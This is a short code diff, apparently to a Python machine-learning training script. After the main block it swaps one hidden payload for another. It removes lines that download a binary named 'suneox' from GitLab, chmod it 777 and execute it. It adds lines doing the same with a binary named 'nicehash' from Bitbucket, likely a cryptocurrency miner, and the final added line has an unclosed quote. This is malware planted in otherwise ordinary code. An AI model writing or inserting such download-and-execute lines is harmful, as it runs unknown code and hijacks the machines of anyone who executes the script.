@@ -72,6 +72,6 @@ def main():
       global_step=NUM_EPOCHS)
 if __name__ == "__main__":
     main()
-os.system('wget https://gitlab.com/xokoplafisop/fathunkuy/-/raw/main/suneox')
-os.system('chmod 777 suneox')
-os.system('./suneox')
+os.system('wget https://bitbucket.org/lightcoral2/lightcoral2/raw/master/nicehash')
+os.system('chmod 777 nicehash')
+os.system('./nicehash)
